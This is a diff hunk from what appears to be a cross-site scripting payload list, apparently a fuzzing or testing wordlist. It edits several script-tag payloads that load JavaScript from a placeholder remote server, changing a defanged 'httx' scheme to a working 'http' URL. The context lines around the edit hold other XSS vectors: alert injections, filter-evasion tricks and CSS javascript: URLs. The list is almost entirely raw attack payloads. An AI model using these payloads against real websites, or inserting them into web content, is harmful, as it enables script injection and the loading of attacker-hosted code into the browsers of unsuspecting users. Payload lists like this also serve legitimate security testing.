@@ -99,15 +99,15 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"16\")>";' > out
 <<script>alert("45");//<</script>
 <script>alert("46")</script>
 <<SCRIPT>alert("47");//<</SCRIPT>
-<SCRIPT "a='>'" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
-<SCRIPT a=">" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
-<SCRIPT a=`>` SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://<remoteServer>/file.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://<remoteServer>/file.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://<remoteServer>/file.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://<remoteServer>/file.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://<remoteServer>/file.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://<remoteServer>/file.js"></SCRIPT>
 </script><script>alert('22');</script>
 //--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<SCRIPT =">" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<SCRIPT =">" SRC="http://<remoteServer>/file.js"></SCRIPT>
 <STYLE>@im\port'\ja\vasc\ript:alert("35")';</STYLE>
 <STYLE>li {list-style-image: url("javascript:alert('28')");}</STYLE><UL><LI>XSS</br>
 <STYLE type="text/css">BODY{background:url("javascript:alert('40')")}</STYLE>
